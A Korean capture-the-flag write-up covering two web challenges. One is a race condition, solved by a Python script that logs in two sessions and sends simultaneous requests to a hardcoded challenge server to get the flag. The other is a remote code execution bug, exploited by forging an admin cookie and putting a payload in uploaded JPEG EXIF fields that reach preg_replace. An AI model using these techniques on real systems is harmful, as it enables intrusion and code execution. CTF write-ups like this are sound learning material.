레이스 컨디션(race condition) 을 이용하는 문제이다.

서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다.

CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 케이스)

암튼 파이썬으로 코딩해서 문제를 풀어주면 된다.

import requests
import threading

cookie1 = {'PHPSESSID':'bb11'}
cookie2 = {'PHPSESSID':'bb22'}

def login(cookie):
    url = "http://198.13.32.181:4345/login_check.php"
    param = {'id':'bb','pw':'bb'}
    r = requests.post(url, data=param, cookies=cookie)
    print r.text

def times():
    global cookie1;
    url = "http://198.13.32.181:4345/index.php?times=111111111111111111111111111111"
    r = requests.get(url, cookies=cookie1)

def flag():
    global cookie2;
    url = "http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa"
    r = requests.get(url, cookies=cookie2)
    print r.text

def main():
    login(cookie1)
    login(cookie2)
    t1 = threading.Thread(target=times,args=())
    t2 = threading.Thread(target=flag,args=())
    t1.start()
    t2.start()
main()

if($body['admin']==true){

이 부분에 보면 쿠키 값의 admin이 true를 가질 때,

edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다.

처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해

RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다.

$Date = $infor['DateTimeOriginal'];
$Model = $infor['Model'];
$Make = $infor['Make'];
$size = round($infor['FileSize']/1024,1);

이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니,

$model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로

흘러가게 해주면 된다.
